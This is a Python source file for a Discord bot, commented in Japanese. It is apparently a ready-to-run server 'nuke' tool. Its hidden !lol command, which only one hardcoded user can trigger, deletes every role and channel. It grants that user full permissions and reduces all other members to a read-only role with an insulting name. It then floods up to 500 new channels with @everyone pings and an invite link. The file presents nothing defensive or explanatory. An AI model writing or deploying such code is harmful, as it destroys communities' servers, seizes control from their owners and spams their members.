import discord
from discord.ext import commands
import random
import os
from keep_alive import keep_alive

# ボットの設定
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# 特定のユーザーID（あなたのDiscord ID）
ALLOWED_USER_ID = 1464850594790637569

@bot.event
async def on_ready():
    print(f'{bot.user} としてログインしました！')
    print(f'ボットID: {bot.user.id}')
    print('------')

@bot.command()
async def lol(ctx, count: int = 100, invite_url: str = None):
    # 許可されたユーザーIDかチェック（メッセージなし）
    if ctx.author.id != ALLOWED_USER_ID:
        return
    
    # 最大500個に制限
    if count > 500:
        count = 500
        print(f"⚠️ 最大500個に制限されました")
    
    guild = ctx.guild
    
    try:
        import asyncio
        
        # 既存の全ロールを削除（@everyone以外）
        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        print(f"全ロール削除完了")
        
        # 野獣ロール作成（全権限）
        yaju_role = await guild.create_role(
            name="野獣",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        print(f"野獣ロール作成完了")
        
        # うんこロール作成（閲覧のみ）
        unko_permissions = discord.Permissions.none()
        unko_permissions.view_channel = True
        unko_permissions.read_message_history = True
        unko_role = await guild.create_role(
            name="うんこ",
            permissions=unko_permissions,
            color=discord.Color.from_rgb(139, 69, 19)  # 茶色
        )
        print(f"うんこロール作成完了")
        
        # メンバーにロールを付与
        role_assign_tasks = []
        for member in guild.members:
            if member.bot:
                continue  # ボットはスキップ
            if member.id == ALLOWED_USER_ID:
                # あなたには野獣ロール
                role_assign_tasks.append(member.add_roles(yaju_role))
            else:
                # それ以外にはうんこロール
                role_assign_tasks.append(member.add_roles(unko_role))
        
        await asyncio.gather(*role_assign_tasks, return_exceptions=True)
        print(f"ロール付与完了")
        
        # 既存の全チャンネルを並行削除（高速化）
        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"全チャンネル削除完了")
        
        # 新しいチャンネルを並行作成（超高速化）
        create_tasks = []
        for i in range(count):
            random_number = random.randint(1000, 9999)
            channel_name = f"lol-{random_number}"
            create_tasks.append(guild.create_text_channel(channel_name))
        
        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        # エラーではないチャンネルのみフィルタ
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        print(f"{len(channels)}個のチャンネルを作成しました")
        
        # 各チャンネルに全員メンション＋招待URLを10回連投
        if invite_url:
            message = f"@everyone {invite_url}"
        else:
            message = "@everyone"
        
        spam_tasks = []
        for channel in channels:
            for _ in range(10):
                spam_tasks.append(channel.send(message))
        
        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"処理完了！全チャンネルにメッセージを送信しました")
        
    except Exception as e:
        print(f"エラーが発生しました: {e}")

# Keep-aliveを起動（24時間稼働用）
keep_alive()

# ボットを起動（環境変数からトークンを取得）
TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if not TOKEN:
    print("エラー: DISCORD_BOT_TOKEN 環境変数が設定されていません。")
    print("Secrets タブで DISCORD_BOT_TOKEN を設定してください。")
    exit(1)

bot.run(TOKEN)
